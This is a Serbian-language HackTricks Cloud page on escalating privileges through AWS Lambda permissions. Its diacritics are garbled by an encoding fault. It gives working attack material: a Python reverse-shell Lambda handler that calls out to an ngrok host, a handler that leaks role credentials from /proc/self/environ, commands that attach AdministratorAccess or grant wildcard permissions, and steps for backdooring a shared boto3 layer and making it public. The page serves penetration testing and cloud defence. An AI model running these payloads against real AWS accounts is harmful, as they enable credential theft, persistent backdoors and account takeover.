# AWS - Lambda Privesc

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## lambda

ViÅ¡e informacija o lambda funkcijama:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Korisnici sa dozvolama **`iam:PassRole`, `lambda:CreateFunction`, i `lambda:InvokeFunction`** mogu eskalirati svoje privilegije.\
Mogu **kreirati novu Lambda funkciju i dodeliti joj postojeÄ‡u IAM ulogu**, dajuÄ‡i funkciji dozvole koje su povezane sa tom ulogom. Korisnik moÅ¾e zatim **napisati i otpremiti kod u ovu Lambda funkciju (na primer, sa reverzibilnom ljuskom)**.\
Kada je funkcija postavljena, korisnik moÅ¾e **pokrenuti njeno izvrÅ¡avanje** i Å¾eljene akcije pozivanjem Lambda funkcije putem AWS API-ja. Ovaj pristup efikasno omoguÄ‡ava korisniku da obavlja zadatke neizravno putem Lambda funkcije, radeÄ‡i sa nivoom pristupa koji je odobren IAM ulozi koja je povezana sa njom.\\

NapadaÄ bi mogao iskoristiti ovo da dobije **reverzibilnu ljusku i ukrade token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
TakoÄ‘e moÅ¾ete **zloupotrebiti dozvole uloge lambda funkcije** iz same lambda funkcije.\
Ako je uloga lambda funkcije imala dovoljno dozvola, mogli biste je koristiti da vam dodeli administratorska prava:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
TakoÄ‘e je moguÄ‡e procuriti pristupne podatke uloge lambda funkcije bez potrebe za spoljnom konekcijom. Ovo bi bilo korisno za **Lambda funkcije izolovane sa mreÅ¾om** koje se koriste za interne zadatke. Ako postoje nepoznate sigurnosne grupe koje filtriraju vaÅ¡e reverzne ljuske, ovaj komad koda Ä‡e vam omoguÄ‡iti direktno procurivanje pristupnih podataka kao izlaz lambda funkcije.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potencijalni uticaj:** Direktno privesc na odreÄ‘enu lambda uslugu uloge.

{% hint style="danger" %}
Imajte na umu da Äak i ako deluje interesantno **`lambda:InvokeAsync`** **ne dozvoljava samostalno izvrÅ¡avanje `aws lambda invoke-async`**, takoÄ‘e vam je potrebno `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Kao i u prethodnom scenariju, moÅ¾ete **dodeliti sebi dozvolu `lambda:InvokeFunction`** ako imate dozvolu **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potencijalni uticaj:** Direktno privesc na odreÄ‘enu ulogu usluge lambda.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Korisnici sa dozvolama **`iam:PassRole`, `lambda:CreateFunction`, i `lambda:CreateEventSourceMapping`** (i potencijalno `dynamodb:PutItem` i `dynamodb:CreateTable`) mogu indirektno **poveÄ‡ati privilegije** Äak i bez `lambda:InvokeFunction`.\
Mogu kreirati **Lambda funkciju sa zlonamernim kodom i dodeliti joj postojeÄ‡u IAM ulogu**.

Umesto direktnog pozivanja Lambda funkcije, korisnik postavlja ili koristi postojeÄ‡u DynamoDB tabelu, povezujuÄ‡i je sa Lambdom putem mapiranja izvora dogaÄ‘aja. Ovaj setup osigurava da Lambda funkcija bude **automatski pokrenuta prilikom unosa novog elementa** u tabelu, bilo korisnikovom akcijom ili drugim procesom, Äime se indirektno poziva Lambda funkcija i izvrÅ¡ava kod sa dozvolama prosleÄ‘ene IAM uloge.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Ako je DynamoDB veÄ‡ aktivan u AWS okruÅ¾enju, korisnik samo **treba uspostaviti mapiranje izvora dogaÄ‘aja** za Lambda funkciju. MeÄ‘utim, ako se DynamoDB ne koristi, korisnik mora **kreirati novu tabelu** sa omoguÄ‡enim strimovanjem:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Sada je moguÄ‡e **povezati Lambda funkciju sa DynamoDB tabelom** tako Å¡to se **kreira mapiranje izvora dogaÄ‘aja**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Sa Lambda funkcijom povezanom sa DynamoDB stream-om, napadaÄ moÅ¾e **indirektno pokrenuti Lambda funkciju aktiviranjem DynamoDB stream-a**. To se moÅ¾e postiÄ‡i **ubacivanjem stavke** u DynamoDB tabelu:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potencijalni Uticaj:** Direktno privesc na ulogu usluge lambda navedenu.

### `lambda:AddPermission`

NapadaÄ sa ovlaÅ¡Ä‡enjem moÅ¾e **dodeliti sebi (ili drugima) bilo koja ovlaÅ¡Ä‡enja** (ovo generiÅ¡e politike zasnovane na resursima za dodelu pristupa resursu):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potencijalni uticaj:** Direktno privescovanje na ulogu usluge lambda omoguÄ‡eno dodeljivanjem dozvole za izmenu koda i pokretanje istog.

### `lambda:AddLayerVersionPermission`

NapadaÄ sa ovom dozvolom moÅ¾e **sebi (ili drugima) dodeliti dozvolu `lambda:GetLayerVersion`**. Mogao bi pristupiti sloju i traÅ¾iti ranjivosti ili osetljive informacije.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potencijalni uticaj:** Potencijalni pristup osetljivim informacijama.

### `lambda:UpdateFunctionCode`

Korisnici koji imaju dozvolu **`lambda:UpdateFunctionCode`** imaju moguÄ‡nost da **modifikuju kod postojeÄ‡e Lambda funkcije koja je povezana sa IAM ulogom.**\
NapadaÄ moÅ¾e **modifikovati kod lambda funkcije kako bi eksfiltrirao IAM akreditive**.

Iako napadaÄ moÅ¾da nema direktnu sposobnost da pozove funkciju, ako je Lambda funkcija veÄ‡ postojeÄ‡a i operativna, verovatno je da Ä‡e biti pokrenuta kroz postojeÄ‡e tokove rada ili dogaÄ‘aje, time indirektno olakÅ¡avajuÄ‡i izvrÅ¡enje modifikovanog koda.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potencijalni uticaj:** Direktno privesc na ulogu usluge lambda koja se koristi.

### `lambda:UpdateFunctionConfiguration`

#### Uvod

[**Lambda slojevi**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) omoguÄ‡avaju ukljuÄivanje **koda** u vaÅ¡u lambda funkciju ali ga **Äuvaju odvojeno**, tako da kod funkcije moÅ¾e ostati mali i **viÅ¡e funkcija moÅ¾e deliti kod**.

Unutar lambda moÅ¾ete proveriti putanje sa kojih se uÄitava python kod pomoÄ‡u funkcije poput sledeÄ‡e:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Ovo su mesta:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Na primer, biblioteka boto3 se uÄitava iz `/var/runtime/boto3` (4. pozicija).

#### Eksploatacija

MoguÄ‡e je zloupotrebiti dozvolu `lambda:UpdateFunctionConfiguration` da **dodamo novi sloj** funkciji lambda. Da bismo izvrÅ¡ili proizvoljni kod, ovaj sloj mora sadrÅ¾ati neku **biblioteku koju Ä‡e lambda uvesti.** Ako moÅ¾ete da proÄitate kod lambde, to biste mogli lako da pronaÄ‘ete, takoÄ‘e imajte na umu da je moguÄ‡e da lambda **veÄ‡ koristi sloj** i da biste mogli **preuzeti** sloj i **dodati svoj kod** tamo.

Na primer, pretpostavimo da lambda koristi biblioteku boto3, ovo Ä‡e kreirati lokalni sloj sa poslednjom verzijom biblioteke:
```
pip3 install -t ./lambda_layer boto3
```
MoÅ¾ete otvoriti `./lambda_layer/boto3/__init__.py` i **dodati backdoor u globalni kod** (funkciju za eksfiltraciju akreditiva ili dobijanje reverznog Å¡ela na primer).

Zatim, zapakujte taj `./lambda_layer` direktorijum i **uÄitajte novi lambda sloj** na svoj nalog (ili na nalog Å¾rtve, ali moÅ¾da nemate dozvole za ovo).\
Imajte na umu da morate kreirati python folder i staviti biblioteke unutra da prepiÅ¡ete /opt/python/boto3. TakoÄ‘e, sloj mora biti **kompatibilan sa verzijom pythona** koju koristi lambda i ako ga uÄitate na svoj nalog, mora biti u **istom regionu:**

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Sada, omoguÄ‡ite da je postavljeni lambda sloj **dostupan svakom nalogu**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
I poveÅ¾ite lambda sloj sa ciljnom lambda funkcijom:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
SledeÄ‡i korak bio bi ili **pozvati funkciju** sami ako moÅ¾emo ili saÄekati da bude **pozvana** na uobiÄajeni naÄin - Å¡to je sigurnija metoda.

**JoÅ¡ prikriveniji naÄin za iskoriÅ¡Ä‡avanje ove ranjivosti** moÅ¾e se pronaÄ‡i u:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potencijalni uticaj:** Direktno preuzimanje privilegija nad ulogom usluge lambda koja se koristi.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

MoÅ¾da s tim dozvolama moÅ¾ete kreirati funkciju i izvrÅ¡iti je pozivajuÄ‡i URL... ali nisam uspeo da pronaÄ‘em naÄin da to testiram, pa mi javite ako vi uspete!

### Lambda MitM

Neke lambda funkcije Ä‡e **primali osetljive informacije od korisnika u parametrima.** Ako dobijete RCE u jednoj od njih, moÅ¾ete izfiltrirati informacije koje drugi korisnici Å¡alju, proverite u:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Reference

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
